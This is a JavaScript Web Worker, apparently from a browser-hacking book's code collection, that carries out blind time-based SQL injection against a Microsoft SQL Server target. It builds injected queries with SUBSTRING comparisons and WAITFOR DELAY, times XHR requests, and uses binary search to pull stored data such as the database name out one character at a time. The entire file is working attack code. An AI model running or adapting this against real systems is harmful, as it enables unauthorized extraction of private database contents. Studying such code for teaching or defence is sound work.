var uri, port, path, payload;
var index, seconds, position;

/* Configuration coming from the code that instantiates the WebWorker (father) */
onmessage = function (e) {
 uri = e.data['uri'];
 port = e.data['port'];
 path = e.data['path'];
 payload = e.data['payload'];
 
 index = e.data['index'];
 seconds = e.data['seconds'];
 position = e.data['position'];

 retrieveChar(index, seconds, position);
};

function retrieveChar(index, seconds, position){
	var lowerbound = 1;
	var upperbound = 127;
	var index;
	var isLastReqSleep = false;
	var reqNumber = 0;
	var stringEndReached = true; // if all requests do not delay, it means we're querying an out of bound position.

	function doRequest(index, seconds, position){
	 //console.log("request -> index: " + index + ", delay: " + seconds + " seconds, position: " + position);

	 if(lowerbound <= upperbound){
	     reqNumber++;
	 	 index = Math.floor((lowerbound + upperbound) / 2);
		 var enc_payload = encodeURI(payload + position + ",1))>" + index + ") WAITFOR DELAY '0:0:" + seconds + "'--");
		 // payload is something like:  IF(UNICODE(SUBSTRING((SELECT ISNULL(CAST(DB_NAME() AS NVARCHAR(4000)),CHAR(32))),
		 var xhr = new XMLHttpRequest();
		 var started = new Date().getTime();
		 xhr.open("GET", uri + ":" + port + path + enc_payload, false);
		 xhr.onreadystatechange=function(){
		 if(xhr.readyState == 4){
		    var finished = new Date().getTime();
		    var respTime = (finished - started)/1000;
		    
		    /* Binary inference. With 7 requests per character we can determine the character
		    Decimal representation. If the request is not delayed of at least N 'seconds', we can 
		    infer that the Decimal representation of the character (lets say 115) is not greater than 'index' 127:
		    IF(115>127) WAITFOR. Continue in the same way, changing 'index' to 63...
		    */
		    if(respTime >= seconds){
		    	lowerbound = index + 1;
		        if(reqNumber == 7) isLastReqSleep = true;
		        stringEndReached = false;
		    }else{
		    	upperbound = index - 1; 
		    }
		    /* Call doRequest() recursively*/
		    doRequest(index, seconds, position);
		 }
		 }
		 xhr.send();

	 }else{
	    if(isLastReqSleep){ 
	        index++;
	    }
	    /* Notifies the WebWorker father with the retrieved character at the current position.
	    If stringEndReached==true means we're querying an out of bound position, and found the end of the 
	    data we are retrieving */
	 	postMessage({'position':position,'char':index,'end':stringEndReached});
	 	self.close(); //close the worker
	 	return index;
	 }
	}

	// starts sending requests
	doRequest(index, seconds, position);
}

// https://browserhacker.com/code/code_index.html
